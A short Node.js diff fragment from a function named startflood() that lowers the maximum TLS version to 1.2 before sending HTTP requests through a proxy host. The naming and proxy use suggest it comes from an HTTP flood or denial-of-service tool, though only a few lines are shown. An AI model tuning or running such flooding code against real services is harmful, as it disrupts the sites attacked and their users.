@@ -582,7 +582,7 @@ function startflood(){
                 var http = require('http'),
                     tls = require('tls');
                     
-                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
+                tls.DEFAULT_MAX_VERSION = 'TLSv1.2';
             
                 var req = http.request({ 
                     host: proxy[0],
